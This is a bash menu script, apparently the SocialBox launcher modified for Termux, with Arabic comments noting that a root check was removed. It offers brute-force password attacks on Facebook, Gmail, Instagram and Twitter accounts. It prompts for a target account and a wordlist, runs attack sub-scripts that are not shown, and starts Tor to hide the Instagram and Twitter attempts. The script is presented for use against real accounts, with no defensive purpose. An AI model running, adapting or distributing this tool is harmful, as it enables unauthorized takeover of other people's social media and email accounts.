#!/bin/bash
#Colors
white="\033[1;37m"
grey="\033[0;37m"
purple="\033[0;35m"
red="\033[1;31m"
green="\033[1;32m"
yellow="\033[1;33m"
Purple="\033[0;35m"
Cyan="\033[0;36m"
Cafe="\033[0;33m"
Fiuscha="\033[0;35m"
blue="\033[1;34m"
nc="\e[0m"

# [تم التعديل] تمت إزالة شرط فحص الروت ليشتغل السكربت في تيرمكس العادي فوراً

#Installation
sleep 1
echo -e "Checking Installation $nc"
if [ -f "install-sb.sh" ]; then
    bash install-sb.sh
fi
echo -e "Checking Completed [$green✓$nc] $nc "
sleep 1
clear

#Startup
echo -e "$green"
echo "          .▄▄ ·        ▄▄· ▪   ▄▄▄· ▄▄▌      ▄▄▄▄·       ▐▄• ▄ "
echo "          ▐█ ▀. ▪     ▐█ ▌▪██ ▐█ ▀█ ██•      ▐█ ▀█▪▪      █▌█▌▪"
echo "          ▄▀▀▀█▄ ▄█▀▄ ██ ▄▄▐█·▄█▀▀█ ██▪      ▐█▀▀█▄ ▄█▀▄  ·██· "
echo "          ▐█▄▪▐█▐█▌.▐▌▐███▌▐█▌▐█ ▪▐▌▐█▌▐▌    ██▄▪▐█▐█▌.▐▌▪▐█·█▌"
echo -e "                ▀▀▀▀  ▀█▄▀▪·▀▀▀ ▀▀▀ ▀  ▀ .▀▀▀     ·▀▀▀▀  ▀█▄▀▪•▀▀ ▀▀$nc $blue v1$nc"
echo -e "       [+]              $red Coded By Belahsan Ouerghi$nc                            [+]"
echo -e "       [+]              $red www.facebook.com/ouerghi.belahsan$nc                    [+]"
echo -e "       [+]              $red Greetz To All Pentesters$nc                             [+]"
echo -e "       [+]$red Special Greetz To$nc :$green {thelinuxchoice , Ha3MrX, Tunisian Eagles}$nc [+]"
echo ""
echo -e "$yellow Select From Menu : $nc"
echo ""
echo -e "               $Cyan 1 : Brute Force Facebook Account$nc"
echo -e "               $Cyan 2 : Brute Force Gmail Account$nc"
echo -e "               $Cyan 3 : Brute Force Instagram Account$nc"
echo -e "               $Cyan 4 : Brute Force Twitter Account$nc"
echo -e "               $Cyan 99: Exit$nc"
read -p "Choice >  " ch

if [ "$ch" = "1" ]; then
    echo -e "                       $Cyan Facebook Brute Force$nc"
    echo -e "$green"
    read -p "Enter Facebook ID / Email / Username / Number: " id
    read -p "Enter wordlist path : " wordlist
    echo -e "$nc"
    cd facebook && perl fb-brute.pl "$id" "$wordlist"
    echo -e "               [+]$yellow Brute Force Complete $nc[$green✓$nc] $nc[+]"
    echo -e "$red"
    read -p "Wanna Back To Main Menu [ Y / n ] : " check
    echo -e "$nc"
    if [[ "$check" =~ ^[Yy][Ee][Ss]$ || "$check" =~ ^[Yy]$ ]]; then
        cd .. && bash SocialBox.sh
    else
        exit 0
    fi

elif [ "$ch" = "2" ]; then
    echo -e "                       $Cyan Gmail Brute Force$nc"
    cd Gemail-Hack && python2 gemailhack.py
    echo -e "               [+]$yellow Brute Force Complete $nc[$green✓$nc] $nc[+]"
    echo -e "$red"
    read -p "Wanna Back To Main Menu [ Y / n ] : " check2
    echo -e "$nc"
    if [[ "$check2" =~ ^[Yy][Ee][Ss]$ || "$check2" =~ ^[Yy]$ ]]; then
        cd .. && bash SocialBox.sh
    else
        exit 0
    fi

elif [ "$ch" = "3" ]; then
    echo -e "                       $Cyan Instagram Brute Force$nc"
    cd instainsane/
    echo -e "       [+]$red Service Tor Starting $nc[+]"
    sleep 0.5
    # في تيرمكس يفضل تشغيل الديمون بدون تثبيت كخدمة كاملة بالنظام إن لم تكن مروتاً
    tor & 
    sleep 2
    bash instainsane.sh
    echo -e "               [+]$yellow Brute Force Complete $nc[$green✓$nc] $nc[+]"
    killall tor
    echo -e "               [+]$red Service Tor Stopped$nc [+]"
    echo -e "$red"
    read -p "Wanna Back To Main Menu [ Y / n ] : " check3
    echo -e "$nc"
    if [[ "$check3" =~ ^[Yy][Ee][Ss]$ || "$check3" =~ ^[Yy]$ ]]; then
        cd .. && bash SocialBox.sh
    else
        exit 0
    fi

elif [ "$ch" = "4" ]; then
    echo -e "                       $Cyan Twitter Brute Force$nc"
    cd tweetshell/
    echo -e "       [+]$red Service Tor Starting $nc[+]"
    sleep 0.5
    tor &
    sleep 2
    bash tweetshell.sh
    echo -e "               [+]$yellow Brute Force Complete $nc[$green✓$nc] $nc[+]"

killall tor
    echo -e "               [+]$red Service Tor Stopped$nc [+]"
    echo -e "$red"
    read -p "Wanna Back To Main Menu [ Y / n ] : " check4
    echo -e "$nc"
    if [[ "$check4" =~ ^[Yy][Ee][Ss]$ || "$check4" =~ ^[Yy]$ ]]; then
        cd .. && bash SocialBox.sh
    else
        exit 0
    fi

elif [ "$ch" = "99" ]; then
    echo -e "$red Program Exit ...$nc"
    sleep 0.25
    exit 0
else
    echo "Not Found 404 , Exit"
    exit 1
fi
